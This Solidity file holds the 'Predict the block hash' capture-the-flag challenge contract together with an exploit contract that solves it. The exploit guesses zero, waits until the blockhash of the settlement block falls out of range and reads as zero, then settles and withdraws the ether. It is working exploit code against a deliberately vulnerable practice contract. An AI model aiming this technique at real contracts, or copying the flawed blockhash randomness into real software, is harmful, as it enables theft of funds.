pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheBlockHashExploit {
    function() public payable {}
    address owner;
    uint256 public settlementBlockNumber;
    PredictTheBlockHashChallenge challenge;

    function PredictTheBlockHashExploit(address contractAddress) public payable {
        owner = msg.sender;
        challenge = PredictTheBlockHashChallenge(contractAddress);
        // https://docs.soliditylang.org/en/v0.8.9/units-and-global-variables.html
        challenge.lockInGuess.value(msg.value)(bytes32(0));
        settlementBlockNumber = block.number + 1;
    }

    function exploit() public {
        require(msg.sender == owner);
        require(block.number > settlementBlockNumber);
        require(block.blockhash(settlementBlockNumber) == bytes32(0));
        challenge.settle();
        msg.sender.transfer(address(this).balance);
    }
}